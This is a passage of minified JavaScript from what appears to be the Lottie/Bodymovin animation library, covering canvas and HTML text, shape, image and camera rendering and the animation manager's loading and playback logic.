l,h,c,u,d,p,m,f,g,y,v=this.data.singleShape,_=t.tr/1e3*t.finalSize,b=0,w=0,E=!0,S=0;for(r=0;r<n;r+=1){for(h=(l=this.globalData.fontManager.getCharData(t.finalText[r],s.fStyle,this.globalData.fontManager.getFontByName(t.f).fFamily))&&l.data||{},a.reset(),v&&o[r].n&&(b=-_,w+=t.yOffset,w+=E?1:0,E=!1),m=(d=h.shapes?h.shapes[0].it:[]).length,a.scale(t.finalSize/100,t.finalSize/100),v&&this.applyTextPropertiesToMatrix(t,a,o[r].line,b,w),g=createSizedArray(m),p=0;p<m;p+=1){for(u=d[p].ks.k.i.length,f=d[p].ks.k,y=[],c=1;c<u;c+=1)1==c&&y.push(a.applyToX(f.v[0][0],f.v[0][1],0),a.applyToY(f.v[0][0],f.v[0][1],0)),y.push(a.applyToX(f.o[c-1][0],f.o[c-1][1],0),a.applyToY(f.o[c-1][0],f.o[c-1][1],0),a.applyToX(f.i[c][0],f.i[c][1],0),a.applyToY(f.i[c][0],f.i[c][1],0),a.applyToX(f.v[c][0],f.v[c][1],0),a.applyToY(f.v[c][0],f.v[c][1],0));y.push(a.applyToX(f.o[c-1][0],f.o[c-1][1],0),a.applyToY(f.o[c-1][0],f.o[c-1][1],0),a.applyToX(f.i[0][0],f.i[0][1],0),a.applyToY(f.i[0][0],f.i[0][1],0),a.applyToX(f.v[0][0],f.v[0][1],0),a.applyToY(f.v[0][0],f.v[0][1],0)),g[p]=y}v&&(b+=o[r].l,b+=_),this.textSpans[S]?this.textSpans[S].elem=g:this.textSpans[S]={elem:g},S+=1}},CVTextElement.prototype.renderInnerContent=function(){var t=this.canvasContext;this.finalTransform.mat.props,t.font=this.values.fValue,t.lineCap="butt",t.lineJoin="miter",t.miterLimit=4,this.data.singleShape||this.textAnimator.getMeasures(this.textProperty.currentData,this.lettersChangedFlag);var e,i,r,n,s,o,a=this.textAnimator.renderedLetters,l=this.textProperty.currentData.l;i=l.length;var h,c,u,d=null,p=null,m=null;for(e=0;e<i;e+=1)if(!l[e].n){if((h=a[e])&&(this.globalData.renderer.save(),this.globalData.renderer.ctxTransform(h.p),this.globalData.renderer.ctxOpacity(h.o)),this.fill){for(h&&h.fc?d!==h.fc&&(d=h.fc,t.fillStyle=h.fc):d!==this.values.fill&&(d=this.values.fill,t.fillStyle=this.values.fill),n=(c=this.textSpans[e].elem).length,this.globalData.canvasContext.beginPath(),r=0;r<n;r+=1)for(o=(u=c[r]).length,this.globalData.canvasContext.moveTo(u[0],u[1]),s=2;s<o;s+=6)this.globalData.canvasContext.bezierCurveTo(u[s],u[s+1],u[s+2],u[s+3],u[s+4],u[s+5]);this.globalData.canvasContext.closePath(),this.globalData.canvasContext.fill()}if(this.stroke){for(h&&h.sw?m!==h.sw&&(m=h.sw,t.lineWidth=h.sw):m!==this.values.sWidth&&(m=this.values.sWidth,t.lineWidth=this.values.sWidth),h&&h.sc?p!==h.sc&&(p=h.sc,t.strokeStyle=h.sc):p!==this.values.stroke&&(p=this.values.stroke,t.strokeStyle=this.values.stroke),n=(c=this.textSpans[e].elem).length,this.globalData.canvasContext.beginPath(),r=0;r<n;r+=1)for(o=(u=c[r]).length,this.globalData.canvasContext.moveTo(u[0],u[1]),s=2;s<o;s+=6)this.globalData.canvasContext.bezierCurveTo(u[s],u[s+1],u[s+2],u[s+3],u[s+4],u[s+5]);this.globalData.canvasContext.closePath(),this.globalData.canvasContext.stroke()}h&&this.globalData.renderer.restore()}},CVEffects.prototype.renderFrame=function(){},HBaseElement.prototype={checkBlendMode:function(){},initRendererElement:function(){this.baseElement=createTag(this.data.tg||"div"),this.data.hasMask?(this.svgElement=createNS("svg"),this.layerElement=createNS("g"),this.maskedElement=this.layerElement,this.svgElement.appendChild(this.layerElement),this.baseElement.appendChild(this.svgElement)):this.layerElement=this.baseElement,styleDiv(this.baseElement)},createContainerElements:function(){this.renderableEffectsManager=new CVEffects(this),this.transformedElement=this.baseElement,this.maskedElement=this.layerElement,this.data.ln&&this.layerElement.setAttribute("id",this.data.ln),this.data.cl&&this.layerElement.setAttribute("class",this.data.cl),0!==this.data.bm&&this.setBlendMode()},renderElement:function(){this.finalTransform._matMdf&&(this.transformedElement.style.transform=this.transformedElement.style.webkitTransform=this.finalTransform.mat.toCSS()),this.finalTransform._opMdf&&(this.transformedElement.style.opacity=this.finalTransform.mProp.o.v)},renderFrame:function(){this.data.hd||this.hidden||(this.renderTransform(),this.renderRenderable(),this.renderElement(),this.renderInnerContent(),this._isFirstFrame&&(this._isFirstFrame=!1))},destroy:function(){this.layerElement=null,this.transformedElement=null,this.matteElement&&(this.matteElement=null),this.maskManager&&(this.maskManager.destroy(),this.maskManager=null)},createRenderableComponents:function(){this.maskManager=new MaskElement(this.data,this,this.globalData)},addEffects:function(){},setMatte:function(){}},HBaseElement.prototype.getBaseElement=SVGBaseElement.prototype.getBaseElement,HBaseElement.prototype.destroyBaseElement=HBaseElement.prototype.destroy,HBaseElement.prototype.buildElementParenting=HybridRenderer.prototype.buildElementParenting,extendPrototype([BaseElement,TransformElement,HBaseElement,HierarchyElement,FrameElement,RenderableDOMElement],HSolidElement),HSolidElement.prototype.createContent=function(){var t;this.data.hasMask?((t=createNS("rect")).setAttribute("width",this.data.sw),t.setAttribute("height",this.data.sh),t.setAttribute("fill",this.data.sc),this.svgElement.setAttribute("width",this.data.sw),this.svgElement.setAttribute("height",this.data.sh)):((t=createTag("div")).style.width=this.data.sw+"px",t.style.height=this.data.sh+"px",t.style.backgroundColor=this.data.sc),this.layerElement.appendChild(t)},extendPrototype([HybridRenderer,ICompElement,HBaseElement],HCompElement),HCompElement.prototype._createBaseContainerElements=HCompElement.prototype.createContainerElements,HCompElement.prototype.createContainerElements=function(){this._createBaseContainerElements(),this.data.hasMask?(this.svgElement.setAttribute("width",this.data.w),this.svgElement.setAttribute("height",this.data.h),this.transformedElement=this.baseElement):this.transformedElement=this.layerElement},HCompElement.prototype.addTo3dContainer=function(t,e){for(var i,r=0;r<e;)this.elements[r]&&this.elements[r].getBaseElement&&(i=this.elements[r].getBaseElement()),r+=1;i?this.layerElement.insertBefore(t,i):this.layerElement.appendChild(t)},extendPrototype([BaseElement,TransformElement,HSolidElement,SVGShapeElement,HBaseElement,HierarchyElement,FrameElement,RenderableElement],HShapeElement),HShapeElement.prototype._renderShapeFrame=HShapeElement.prototype.renderInnerContent,HShapeElement.prototype.createContent=function(){var t;if(this.baseElement.style.fontSize=0,this.data.hasMask)this.layerElement.appendChild(this.shapesContainer),t=this.svgElement;else{t=createNS("svg");var e=this.comp.data?this.comp.data:this.globalData.compSize;t.setAttribute("width",e.w),t.setAttribute("height",e.h),t.appendChild(this.shapesContainer),this.layerElement.appendChild(t)}this.searchShapes(this.shapesData,this.itemsData,this.prevViewData,this.shapesContainer,0,[],!0),this.filterUniqueShapes(),this.shapeCont=t},HShapeElement.prototype.getTransformedPoint=function(t,e){var i,r=t.length;for(i=0;i<r;i+=1)e=t[i].mProps.v.applyToPointArray(e[0],e[1],0);return e},HShapeElement.prototype.calculateShapeBoundingBox=function(t,e){var i,r,n,s,o,a=t.sh.v,l=t.transformers,h=a._length;if(!(h<=1)){for(i=0;i<h-1;i+=1)r=this.getTransformedPoint(l,a.v[i]),n=this.getTransformedPoint(l,a.o[i]),s=this.getTransformedPoint(l,a.i[i+1]),o=this.getTransformedPoint(l,a.v[i+1]),this.checkBounds(r,n,s,o,e);a.c&&(r=this.getTransformedPoint(l,a.v[i]),n=this.getTransformedPoint(l,a.o[i]),s=this.getTransformedPoint(l,a.i[0]),o=this.getTransformedPoint(l,a.v[0]),this.checkBounds(r,n,s,o,e))}},HShapeElement.prototype.checkBounds=function(t,e,i,r,n){this.getBoundsOfCurve(t,e,i,r);var s=this.shapeBoundingBox;n.x=bm_min(s.left,n.x),n.xMax=bm_max(s.right,n.xMax),n.y=bm_min(s.top,n.y),n.yMax=bm_max(s.bottom,n.yMax)},HShapeElement.prototype.shapeBoundingBox={left:0,right:0,top:0,bottom:0},HShapeElement.prototype.tempBoundingBox={x:0,xMax:0,y:0,yMax:0,width:0,height:0},HShapeElement.prototype.getBoundsOfCurve=function(t,e,i,r){for(var n,s,o,a,l,h,c,u=[[t[0],r[0]],[t[1],r[1]]],d=0;d<2;++d)if(s=6*t[d]-12*e[d]+6*i[d],n=-3*t[d]+9*e[d]-9*i[d]+3*r[d],o=3*e[d]-3*t[d],s|=0,o|=0,0!=(n|=0))!((l=s*s-4*o*n)<0)&&(0<(h=(-s+bm_sqrt(l))/(2*n))&&h<1&&u[d].push(this.calculateF(h,t,e,i,r,d)),0<(c=(-s-bm_sqrt(l))/(2*n))&&c<1&&u[d].push(this.calculateF(c,t,e,i,r,d)));else{if(0===s)continue;0<(a=-o/s)&&a<1&&u[d].push(this.calculateF(a,t,e,i,r,d))}this.shapeBoundingBox.left=bm_min.apply(null,u[0]),this.shapeBoundingBox.top=bm_min.apply(null,u[1]),this.shapeBoundingBox.right=bm_max.apply(null,u[0]),this.shapeBoundingBox.bottom=bm_max.apply(null,u[1])},HShapeElement.prototype.calculateF=function(t,e,i,r,n,s){return bm_pow(1-t,3)*e[s]+3*bm_pow(1-t,2)*t*i[s]+3*(1-t)*bm_pow(t,2)*r[s]+bm_pow(t,3)*n[s]},HShapeElement.prototype.calculateBoundingBox=function(t,e){var i,r=t.length;for(i=0;i<r;i+=1)t[i]&&t[i].sh?this.calculateShapeBoundingBox(t[i],e):t[i]&&t[i].it&&this.calculateBoundingBox(t[i].it,e)},HShapeElement.prototype.currentBoxContains=function(t){return this.currentBBox.x<=t.x&&this.currentBBox.y<=t.y&&this.currentBBox.width+this.currentBBox.x>=t.x+t.width&&this.currentBBox.height+this.currentBBox.y>=t.y+t.height},HShapeElement.prototype.renderInnerContent=function(){if(this._renderShapeFrame(),!this.hidden&&(this._isFirstFrame||this._mdf)){var t=this.tempBoundingBox,e=999999;if(t.x=e,t.xMax=-e,t.y=e,t.yMax=-e,this.calculateBoundingBox(this.itemsData,t),t.width=t.xMax<t.x?0:t.xMax-t.x,t.height=t.yMax<t.y?0:t.yMax-t.y,this.currentBoxContains(t))return;var i=!1;this.currentBBox.w!==t.width&&(this.currentBBox.w=t.width,this.shapeCont.setAttribute("width",t.width),i=!0),this.currentBBox.h!==t.height&&(this.currentBBox.h=t.height,this.shapeCont.setAttribute("height",t.height),i=!0),(i||this.currentBBox.x!==t.x||this.currentBBox.y!==t.y)&&(this.currentBBox.w=t.width,this.currentBBox.h=t.height,this.currentBBox.x=t.x,this.currentBBox.y=t.y,this.shapeCont.setAttribute("viewBox",this.currentBBox.x+" "+this.currentBBox.y+" "+this.currentBBox.w+" "+this.currentBBox.h),this.shapeCont.style.transform=this.shapeCont.style.webkitTransform="translate("+this.currentBBox.x+"px,"+this.currentBBox.y+"px)")}},extendPrototype([BaseElement,TransformElement,HBaseElement,HierarchyElement,FrameElement,RenderableDOMElement,ITextElement],HTextElement),HTextElement.prototype.createContent=function(){if(this.isMasked=this.checkMasks(),this.isMasked){this.renderType="svg",this.compW=this.comp.data.w,this.compH=this.comp.data.h,this.svgElement.setAttribute("width",this.compW),this.svgElement.setAttribute("height",this.compH);var t=createNS("g");this.maskedElement.appendChild(t),this.innerElem=t}else this.renderType="html",this.innerElem=this.layerElement;this.checkParenting()},HTextElement.prototype.buildNewText=function(){var t=this.textProperty.currentData;this.renderedLetters=createSizedArray(t.l?t.l.length:0);var e=this.innerElem.style;e.color=e.fill=t.fc?this.buildColor(t.fc):"rgba(0,0,0,0)",t.sc&&(e.stroke=this.buildColor(t.sc),e.strokeWidth=t.sw+"px");var i=this.globalData.fontManager.getFontByName(t.f);if(!this.globalData.fontManager.chars)if(e.fontSize=t.finalSize+"px",e.lineHeight=t.finalSize+"px",i.fClass)this.innerElem.className=i.fClass;else{e.fontFamily=i.fFamily;var r=t.fWeight,n=t.fStyle;e.fontStyle=n,e.fontWeight=r}var s,o,a=t.l;o=a.length;var l,h,c,u,d=this.mHelper,p="",m=0;for(s=0;s<o;s+=1){if(this.globalData.fontManager.chars?(this.textPaths[m]?l=this.textPaths[m]:((l=createNS("path")).setAttribute("stroke-linecap","butt"),l.setAttribute("stroke-linejoin","round"),l.setAttribute("stroke-miterlimit","4")),this.isMasked||(this.textSpans[m]?c=(h=this.textSpans[m]).children[0]:((h=createTag("div")).style.lineHeight=0,(c=createNS("svg")).appendChild(l),styleDiv(h)))):this.isMasked?l=this.textPaths[m]?this.textPaths[m]:createNS("text"):this.textSpans[m]?(h=this.textSpans[m],l=this.textPaths[m]):(styleDiv(h=createTag("span")),styleDiv(l=createTag("span")),h.appendChild(l)),this.globalData.fontManager.chars){var f,g=this.globalData.fontManager.getCharData(t.finalText[s],i.fStyle,this.globalData.fontManager.getFontByName(t.f).fFamily);if(f=g?g.data:null,d.reset(),f&&f.shapes&&(u=f.shapes[0].it,d.scale(t.finalSize/100,t.finalSize/100),p=this.createPathShape(d,u),l.setAttribute("d",p)),this.isMasked)this.innerElem.appendChild(l);else{if(this.innerElem.appendChild(h),f&&f.shapes){document.body.appendChild(c);var y=c.getBBox();c.setAttribute("width",y.width+2),c.setAttribute("height",y.height+2),c.setAttribute("viewBox",y.x-1+" "+(y.y-1)+" "+(y.width+2)+" "+(y.height+2)),c.style.transform=c.style.webkitTransform="translate("+(y.x-1)+"px,"+(y.y-1)+"px)",a[s].yOffset=y.y-1}else c.setAttribute("width",1),c.setAttribute("height",1);h.appendChild(c)}}else l.textContent=a[s].val,l.setAttributeNS("http://www.w3.org/XML/1998/namespace","xml:space","preserve"),this.isMasked?this.innerElem.appendChild(l):(this.innerElem.appendChild(h),l.style.transform=l.style.webkitTransform="translate3d(0,"+-t.finalSize/1.2+"px,0)");this.isMasked?this.textSpans[m]=l:this.textSpans[m]=h,this.textSpans[m].style.display="block",this.textPaths[m]=l,m+=1}for(;m<this.textSpans.length;)this.textSpans[m].style.display="none",m+=1},HTextElement.prototype.renderInnerContent=function(){if(this.data.singleShape){if(!this._isFirstFrame&&!this.lettersChangedFlag)return;this.isMasked&&this.finalTransform._matMdf&&(this.svgElement.setAttribute("viewBox",-this.finalTransform.mProp.p.v[0]+" "+-this.finalTransform.mProp.p.v[1]+" "+this.compW+" "+this.compH),this.svgElement.style.transform=this.svgElement.style.webkitTransform="translate("+-this.finalTransform.mProp.p.v[0]+"px,"+-this.finalTransform.mProp.p.v[1]+"px)")}if(this.textAnimator.getMeasures(this.textProperty.currentData,this.lettersChangedFlag),this.lettersChangedFlag||this.textAnimator.lettersChangedFlag){var t,e,i,r,n,s=0,o=this.textAnimator.renderedLetters,a=this.textProperty.currentData.l;for(e=a.length,t=0;t<e;t+=1)a[t].n?s+=1:(r=this.textSpans[t],n=this.textPaths[t],i=o[s],s+=1,i._mdf.m&&(this.isMasked?r.setAttribute("transform",i.m):r.style.transform=r.style.webkitTransform=i.m),r.style.opacity=i.o,i.sw&&i._mdf.sw&&n.setAttribute("stroke-width",i.sw),i.sc&&i._mdf.sc&&n.setAttribute("stroke",i.sc),i.fc&&i._mdf.fc&&(n.setAttribute("fill",i.fc),n.style.color=i.fc));if(this.innerElem.getBBox&&!this.hidden&&(this._isFirstFrame||this._mdf)){var l=this.innerElem.getBBox();this.currentBBox.w!==l.width&&(this.currentBBox.w=l.width,this.svgElement.setAttribute("width",l.width)),this.currentBBox.h!==l.height&&(this.currentBBox.h=l.height,this.svgElement.setAttribute("height",l.height)),(this.currentBBox.w!==l.width+2||this.currentBBox.h!==l.height+2||this.currentBBox.x!==l.x-1||this.currentBBox.y!==l.y-1)&&(this.currentBBox.w=l.width+2,this.currentBBox.h=l.height+2,this.currentBBox.x=l.x-1,this.currentBBox.y=l.y-1,this.svgElement.setAttribute("viewBox",this.currentBBox.x+" "+this.currentBBox.y+" "+this.currentBBox.w+" "+this.currentBBox.h),this.svgElement.style.transform=this.svgElement.style.webkitTransform="translate("+this.currentBBox.x+"px,"+this.currentBBox.y+"px)")}}},extendPrototype([BaseElement,TransformElement,HBaseElement,HSolidElement,HierarchyElement,FrameElement,RenderableElement],HImageElement),HImageElement.prototype.createContent=function(){var t=this.globalData.getAssetsPath(this.assetData),e=new Image;this.data.hasMask?(this.imageElem=createNS("image"),this.imageElem.setAttribute("width",this.assetData.w+"px"),this.imageElem.setAttribute("height",this.assetData.h+"px"),this.imageElem.setAttributeNS("http://www.w3.org/1999/xlink","href",t),this.layerElement.appendChild(this.imageElem),this.baseElement.setAttribute("width",this.assetData.w),this.baseElement.setAttribute("height",this.assetData.h)):this.layerElement.appendChild(e),e.src=t,this.data.ln&&this.baseElement.setAttribute("id",this.data.ln)},extendPrototype([BaseElement,FrameElement,HierarchyElement],HCameraElement),HCameraElement.prototype.setup=function(){var t,e,i=this.comp.threeDElements.length;for(t=0;t<i;t+=1)"3d"===(e=this.comp.threeDElements[t]).type&&(e.perspectiveElem.style.perspective=e.perspectiveElem.style.webkitPerspective=this.pe.v+"px",e.container.style.transformOrigin=e.container.style.mozTransformOrigin=e.container.style.webkitTransformOrigin="0px 0px 0px",e.perspectiveElem.style.transform=e.perspectiveElem.style.webkitTransform="matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)")},HCameraElement.prototype.createElements=function(){},HCameraElement.prototype.hide=function(){},HCameraElement.prototype.renderFrame=function(){var t,e,i=this._isFirstFrame;if(this.hierarchy)for(e=this.hierarchy.length,t=0;t<e;t+=1)i=this.hierarchy[t].finalTransform.mProp._mdf||i;if(i||this.pe._mdf||this.p&&this.p._mdf||this.px&&(this.px._mdf||this.py._mdf||this.pz._mdf)||this.rx._mdf||this.ry._mdf||this.rz._mdf||this.or._mdf||this.a&&this.a._mdf){if(this.mat.reset(),this.hierarchy)for(t=e=this.hierarchy.length-1;t>=0;t-=1){var r=this.hierarchy[t].finalTransform.mProp;this.mat.translate(-r.p.v[0],-r.p.v[1],r.p.v[2]),this.mat.rotateX(-r.or.v[0]).rotateY(-r.or.v[1]).rotateZ(r.or.v[2]),this.mat.rotateX(-r.rx.v).rotateY(-r.ry.v).rotateZ(r.rz.v),this.mat.scale(1/r.s.v[0],1/r.s.v[1],1/r.s.v[2]),this.mat.translate(r.a.v[0],r.a.v[1],r.a.v[2])}if(this.p?this.mat.translate(-this.p.v[0],-this.p.v[1],this.p.v[2]):this.mat.translate(-this.px.v,-this.py.v,this.pz.v),this.a){var n;n=this.p?[this.p.v[0]-this.a.v[0],this.p.v[1]-this.a.v[1],this.p.v[2]-this.a.v[2]]:[this.px.v-this.a.v[0],this.py.v-this.a.v[1],this.pz.v-this.a.v[2]];var s=Math.sqrt(Math.pow(n[0],2)+Math.pow(n[1],2)+Math.pow(n[2],2)),o=[n[0]/s,n[1]/s,n[2]/s],a=Math.sqrt(o[2]*o[2]+o[0]*o[0]),l=Math.atan2(o[1],a),h=Math.atan2(o[0],-o[2]);this.mat.rotateY(h).rotateX(-l)}this.mat.rotateX(-this.rx.v).rotateY(-this.ry.v).rotateZ(this.rz.v),this.mat.rotateX(-this.or.v[0]).rotateY(-this.or.v[1]).rotateZ(this.or.v[2]),this.mat.translate(this.globalData.compSize.w/2,this.globalData.compSize.h/2,0),this.mat.translate(0,0,this.pe.v);var c=!this._prevMat.equals(this.mat);if((c||this.pe._mdf)&&this.comp.threeDElements){var u;for(e=this.comp.threeDElements.length,t=0;t<e;t+=1)"3d"===(u=this.comp.threeDElements[t]).type&&(c&&(u.container.style.transform=u.container.style.webkitTransform=this.mat.toCSS()),this.pe._mdf&&(u.perspectiveElem.style.perspective=u.perspectiveElem.style.webkitPerspective=this.pe.v+"px"));this.mat.clone(this._prevMat)}}this._isFirstFrame=!1},HCameraElement.prototype.prepareFrame=function(t){this.prepareProperties(t,!0)},HCameraElement.prototype.destroy=function(){},HCameraElement.prototype.getBaseElement=function(){return null},HEffects.prototype.renderFrame=function(){};var animationManager=function(){var t={},e=[],i=0,r=0,n=0,s=!0,o=!1;function a(t){for(var i=0,n=t.target;i<r;)e[i].animation===n&&(e.splice(i,1),i-=1,r-=1,n.isPaused||c()),i+=1}function l(t,i){if(!t)return null;for(var n=0;n<r;){if(e[n].elem==t&&null!==e[n].elem)return e[n].animation;n+=1}var s=new AnimationItem;return u(s,t),s.setData(t,i),s}function h(){n+=1,m()}function c(){n-=1}function u(t,i){t.addEventListener("destroy",a),t.addEventListener("_active",h),t.addEventListener("_idle",c),e.push({elem:i,animation:t}),r+=1}function d(t){var a,l=t-i;for(a=0;a<r;a+=1)e[a].animation.advanceTime(l);i=t,n&&!o?window.requestAnimationFrame(d):s=!0}function p(t){i=t,window.requestAnimationFrame(d)}function m(){!o&&n&&s&&(window.requestAnimationFrame(p),s=!1)}return t.registerAnimation=l,t.loadAnimation=function(t){var e=new AnimationItem;return u(e,null),e.setParams(t),e},t.setSpeed=function(t,i){var n;for(n=0;n<r;n+=1)e[n].animation.setSpeed(t,i)},t.setDirection=function(t,i){var n;for(n=0;n<r;n+=1)e[n].animation.setDirection(t,i)},t.play=function(t){var i;for(i=0;i<r;i+=1)e[i].animation.play(t)},t.pause=function(t){var i;for(i=0;i<r;i+=1)e[i].animation.pause(t)},t.stop=function(t){var i;for(i=0;i<r;i+=1)e[i].animation.stop(t)},t.togglePause=function(t){var i;for(i=0;i<r;i+=1)e[i].animation.togglePause(t)},t.searchAnimations=function(t,e,i){var r,n=[].concat([].slice.call(document.getElementsByClassName("lottie")),[].slice.call(document.getElementsByClassName("bodymovin"))),s=n.length;for(r=0;r<s;r+=1)i&&n[r].setAttribute("data-bm-type",i),l(n[r],t);if(e&&0===s){i||(i="svg");var o=document.getElementsByTagName("body")[0];o.innerHTML="";var a=createTag("div");a.style.width="100%",a.style.height="100%",a.setAttribute("data-bm-type",i),o.appendChild(a),l(a,t)}},t.resize=function(){var t;for(t=0;t<r;t+=1)e[t].animation.resize()},t.goToAndStop=function(t,i,n){var s;for(s=0;s<r;s+=1)e[s].animation.goToAndStop(t,i,n)},t.destroy=function(t){var i;for(i=r-1;i>=0;i-=1)e[i].animation.destroy(t)},t.freeze=function(){o=!0},t.unfreeze=function(){o=!1,m()},t.getRegisteredAnimations=function(){var t,i=e.length,r=[];for(t=0;t<i;t+=1)r.push(e[t].animation);return r},t}(),AnimationItem=function(){this._cbs=[],this.name="",this.path="",this.isLoaded=!1,this.currentFrame=0,this.currentRawFrame=0,this.firstFrame=0,this.totalFrames=0,this.frameRate=0,this.frameMult=0,this.playSpeed=1,this.playDirection=1,this.playCount=0,this.animationData={},this.assets=[],this.isPaused=!0,this.autoplay=!1,this.loop=!0,this.renderer=null,this.animationID=createElementID(),this.assetsPath="",this.timeCompleted=0,this.segmentPos=0,this.isSubframeEnabled=subframeEnabled,this.segments=[],this._idle=!0,this._completedLoop=!1,this.projectInterface=ProjectInterface(),this.imagePreloader=new ImagePreloader};extendPrototype([BaseEvent],AnimationItem),AnimationItem.prototype.setParams=function(t){(t.wrapper||t.container)&&(this.wrapper=t.wrapper||t.container);var e=t.animType?t.animType:t.renderer?t.renderer:"svg";switch(e){case"canvas":this.renderer=new CanvasRenderer(this,t.rendererSettings);break;case"svg":this.renderer=new SVGRenderer(this,t.rendererSettings);break;default:this.renderer=new HybridRenderer(this,t.rendererSettings)}this.imagePreloader.setCacheType(e),this.renderer.setProjectInterface(this.projectInterface),this.animType=e,""===t.loop||null===t.loop||void 0===t.loop||!0===t.loop?this.loop=!0:!1===t.loop?this.loop=!1:this.loop=parseInt(t.loop),this.autoplay=!("autoplay"in t)||t.autoplay,this.name=t.name?t.name:"",this.autoloadSegments=!t.hasOwnProperty("autoloadSegments")||t.autoloadSegments,this.assetsPath=t.assetsPath,this.initialSegment=t.initialSegment,t.animationData?this.configAnimation(t.animationData):t.path&&(-1!==t.path.lastIndexOf("\\")?this.path=t.path.substr(0,t.path.lastIndexOf("\\")+1):this.path=t.path.substr(0,t.path.lastIndexOf("/")+1),this.fileName=t.path.substr(t.path.lastIndexOf("/")+1),this.fileName=this.fileName.substr(0,this.fileName.lastIndexOf(".json")),assetLoader.load(t.path,this.configAnimation.bind(this),function(){this.trigger("data_failed")}.bind(this)))},AnimationItem.prototype.setData=function(t,e){var i={wrapper:t,animationData:e?"object"==typeof e?e:JSON.parse(e):null},r=t.attributes;i.path=r.getNamedItem("data-animation-path")?r.getNamedItem("data-animation-path").value:r.getNamedItem("data-bm-path")?r.getNamedItem("data-bm-path").value:r.getNamedItem("bm-path")?r.getNamedItem("bm-path").value:"",i.animType=r.getNamedItem("data-anim-type")?r.getNamedItem("data-anim-type").value:r.getNamedItem("data-bm-type")?r.getNamedItem("data-bm-type").value:r.getNamedItem("bm-type")?r.getNamedItem("bm-type").value:r.getNamedItem("data-bm-renderer")?r.getNamedItem("data-bm-renderer").value:r.getNamedItem("bm-renderer")?r.getNamedItem("bm-renderer").value:"canvas";var n=r.getNamedItem("data-anim-loop")?r.getNamedItem("data-anim-loop").value:r.getNamedItem("data-bm-loop")?r.getNamedItem("data-bm-loop").value:r.getNamedItem("bm-loop")?r.getNamedItem("bm-loop").value:"";""===n||(i.loop="false"!==n&&("true"===n||parseInt(n)));var s=r.getNamedItem("data-anim-autoplay")?r.getNamedItem("data-anim-autoplay").value:r.getNamedItem("data-bm-autoplay")?r.getNamedItem("data-bm-autoplay").value:!r.getNamedItem("bm-autoplay")||r.getNamedItem("bm-autoplay").value;i.autoplay="false"!==s,i.name=r.getNamedItem("data-name")?r.getNamedItem("data-name").value:r.getNamedItem("data-bm-name")?r.getNamedItem("data-bm-name").value:r.getNamedItem("bm-name")?r.getNamedItem("bm-name").value:"","false"===(r.getNamedItem("data-anim-prerender")?r.getNamedItem("data-anim-prerender").value:r.getNamedItem("data-bm-prerender")?r.getNamedItem("data-bm-prerender").value:r.getNamedItem("bm-prerender")?r.getNamedItem("bm-prerender").value:"")&&(i.prerender=!1),this.setParams(i)},AnimationItem.prototype.includeLayers=function(t){t.op>this.animationData.op&&(this.animationData.op=t.op,this.totalFrames=Math.floor(t.op-this.animationData.ip));var e,i,r=this.animationData.layers,n=r.length,s=t.layers,o=s.length;for(i=0;i<o;i+=1)for(e=0;e<n;){if(r[e].id==s[i].id){r[e]=s[i];break}e+=1}if((t.chars||t.fonts)&&(this.renderer.globalData.fontManager.addChars(t.chars),this.renderer.globalData.fontManager.addFonts(t.fonts,this.renderer.globalData.defs)),t.assets)for(n=t.assets.length,e=0;e<n;e+=1)this.animationData.assets.push(t.assets[e]);this.animationData.__complete=!1,dataManager.completeData(this.animationData,this.renderer.globalData.fontManager),this.renderer.includeLayers(t.layers),expressionsPlugin&&expressionsPlugin.initExpressions(this),this.loadNextSegment()},AnimationItem.prototype.loadNextSegment=function(){var t=this.animationData.segments;if(!t||0===t.length||!this.autoloadSegments)return this.trigger("data_ready"),void(this.timeCompleted=this.totalFrames);var e=t.shift();this.timeCompleted=e.time*this.frameRate;var i=this.path+this.fileName+"_"+this.segmentPos+".json";this.segmentPos+=1,assetLoader.load(i,this.includeLayers.bind(this),function(){this.trigger("data_failed")}.bind(this))},AnimationItem.prototype.loadSegments=function(){this.animationData.segments||(this.timeCompleted=this.totalFrames),this.loadNextSegment()},AnimationItem.prototype.imagesLoaded=function(){this.trigger("loaded_images"),this.checkLoaded()},AnimationItem.prototype.preloadImages=function(){this.imagePreloader.setAssetsPath(this.assetsPath),this.imagePreloader.setPath(this.path),this.imagePreloader.loadAssets(this.animationData.assets,this.imagesLoaded.bind(this))},AnimationItem.prototype.configAnimation=function(t){if(this.renderer)try{this.animationData=t,this.initialSegment?(this.totalFrames=Math.floor(this.initialSegment[1]-this.initialSegment[0]),this.firstFrame=Math.round(this.initialSegment[0])):(this.totalFrames=Math.floor(this.animationData.op-this.animationData.ip),this.firstFrame=Math.round(this.animationData.ip)),this.renderer.configAnimation(t),t.assets||(t.assets=[]),this.assets=this.animationData.assets,this.frameRate=this.animationData.fr,this.frameMult=this.animationData.fr/1e3,this.renderer.searchExtraCompositions(t.assets),this.trigger("config_ready"),this.preloadImages(),this.loadSegments(),this.updaFrameModifier(),this.waitForFontsLoaded()}catch(t){this.triggerConfigError(t)}},AnimationItem.prototype.waitForFontsLoaded=function(){!this.renderer||(this.renderer.globalData.fontManager.isLoaded?this.checkLoaded():setTimeout(this.waitForFontsLoaded.bind(this),20))},AnimationItem.prototype.checkLoaded=function(){!this.isLoaded&&this.renderer.globalData.fontManager.isLoaded&&(this.imagePreloader.loaded()||"canvas"!==this.renderer.rendererType)&&(this.isLoaded=!0,dataManager.completeData(this.animationData,this.renderer.globalData.fontManager),expressionsPlugin&&expressionsPlugin.initExpressions(this),this.renderer.initItems(),setTimeout(function(){this.trigger("DOMLoaded")}.bind(this),0),this.gotoFrame(),this.autoplay&&this.play())},AnimationItem.prototype.resize=function(){this.renderer.updateContainerSize()},AnimationItem.prototype.setSubframe=function(t){this.isSubframeEnabled=!!t},AnimationItem.prototype.gotoFrame=function(){this.currentFrame=this.isSubframeEnabled?this.currentRawFrame:~~this.currentRawFrame,this.timeCompleted!==this.totalFrames&&this.currentFrame>this.timeCompleted&&(this.currentFrame=this.timeCompleted),this.trigger("enterFrame"),this.renderFrame()},AnimationItem.prototype.renderFrame=function(){if(!1!==this.isLoaded)try{this.renderer.renderFrame(this.currentFrame+this.firstFrame)}catch(t){this.triggerRenderFrameError(t)}},AnimationItem.prototype.play=function(t){t&&this.name!=t||!0===this.isPaused&&(this.isPaused=!1,this._idle&&(this._idle=!1,this.trigger("_active")))},AnimationItem.prototype.pause=function(t){t&&this.name!=t||!1===this.isPaused&&(this.isPaused=!0,this._idle=!0,this.trigger("_idle"))},AnimationItem.prototype.togglePause=function(t){t&&this.name!=t||(!0===this.isPaused?this.play():this.pause())},AnimationItem.prototype.stop=function(t)